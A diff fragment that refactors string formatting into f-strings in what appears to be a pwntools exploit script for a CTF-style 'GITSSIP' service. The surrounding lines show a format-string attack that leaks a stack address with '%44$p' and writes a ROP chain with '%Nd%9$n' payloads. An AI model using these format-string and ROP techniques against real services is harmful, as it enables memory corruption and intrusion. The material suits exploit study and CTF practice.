@@ -34,8 +34,8 @@ def new_conn():
 
 def do_register(name, to):
     r.sendline('REGISTER FOO GITSSIP/1.0')
-    r.sendline('Common Name: ' + name)
-    r.sendline('To: ' + to)
+    r.sendline(f'Common Name: {name}')
+    r.sendline(f'To: {to}')
     r.sendline('From: ' + 'A')
     r.sendline('Expires: ' + 'A')
     r.sendline('Contact: ' + 'A')
@@ -43,7 +43,7 @@ def do_register(name, to):
 
 def do_directory_search(what):
     r.sendline('DIRECTORY FOO GITSSIP/1.0')
-    r.sendline('Search: ' + what)
+    r.sendline(f'Search: {what}')
 
 #Leak the stack address
 do_register("A", "%44$p")
@@ -65,7 +65,7 @@ def put_rop(rop1):
             to_print += 256
 
         assert '\n' not in name
-        do_register(name, "%" + str(to_print) + "d%9$n")
+        do_register(name, f"%{str(to_print)}d%9$n")
 
 #Do one leak by ropping to send and recv
 @MemLeak
